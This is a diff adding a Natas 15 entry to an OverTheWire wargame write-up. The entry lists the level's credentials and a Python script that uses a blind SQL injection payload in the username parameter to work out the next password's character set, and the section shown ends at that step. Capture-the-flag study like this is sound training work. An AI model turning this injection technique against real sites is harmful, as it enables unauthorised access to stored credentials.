@@ -236,3 +236,32 @@ We got the pass!!
 ## Natas 15
 Username: natas15
 Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+URL:      http://natas14.natas.labs.overthewire.org
+
+We are going to do blind SQl injection in the website to get the password.
+
+As we're looking for the password for the natas16, let's try the username as natas16...
+And it exists.
+
+We use python to break the password charset.
+code for finding the charset via bruteforce method of checking as follows:
+
+    import requests
+    target = 'http://natas15.natas.labs.overthewire.org'
+    charset_0 = (
+            '0123456789' +
+            'abcdefghijklmnopqrstuvwxyz' +
+            'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    )
+    charset_1 = ''
+
+    for c in charset_0:
+            username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
+            r = requests.get(target,
+                    auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
+                    params={"username": username}
+            )
+            if "This user exists" in r.text:
+                    charset_1 += c
+                    print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
+
